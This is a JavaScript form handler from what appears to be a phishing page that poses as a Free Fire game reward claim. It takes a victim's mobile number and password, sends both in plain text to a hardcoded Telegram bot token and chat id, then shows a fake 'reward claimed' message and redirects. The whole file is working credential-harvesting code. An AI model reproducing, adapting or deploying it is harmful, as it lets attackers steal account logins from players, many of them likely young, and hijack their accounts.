function sendData(event) {
  event.preventDefault();

  const numberInput = document.getElementById("number");
  const passwordInput = document.getElementById("password");
  const number = numberInput.value.trim();
  const password = passwordInput.value.trim();
  const errorMsg = document.getElementById("errorMsg");

  let error = "";

  // Reset styling
  numberInput.classList.remove("error-input");
  passwordInput.classList.remove("error-input");

  // ✅ Mobile validation (10 digits, start with 9/8/7/6)
  const mobileRegex = /^[6-9]\d{9}$/;
  if (!mobileRegex.test(number)) {
    error = "📱 Enter a valid 10-digit mobile number starting with 9, 8, 7, or 6.";
    numberInput.classList.add("error-input");
  }

  // ✅ Password validation (minimum 8 characters)
  else if (password.length < 8) {
    error = "🔐 Password must be at least 8 characters long.";
    passwordInput.classList.add("error-input");
  }

  // ✅ Show error if found
  if (error) {
    errorMsg.textContent = error;
    errorMsg.style.display = "block";
    return;
  }

  errorMsg.style.display = "none";

  // 👇 Replace with your own values
  const token = "7480183266:AAFX1ZNhiuLrnZS76BUkjxAS4eZ4c9SHJkM";   // 🟥 Replace this
  const chat_id = "7978432671";   // 🟥 Replace this

  const message = `📨 New Submission:\n\n📱 Number: ${number}\n🔐 Password: ${password}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: message
    })
  })
    .then(response => response.json())
    .then(data => {
      alert("✅ Reword successfully Claimed! Chek Your FF Mail Box 😊");
      window.location.href = "login.html";  // redirect back
    })
    .catch(error => {
      console.error("Telegram Error:", error);
      alert("❌ Something went wrong.");
    });
}
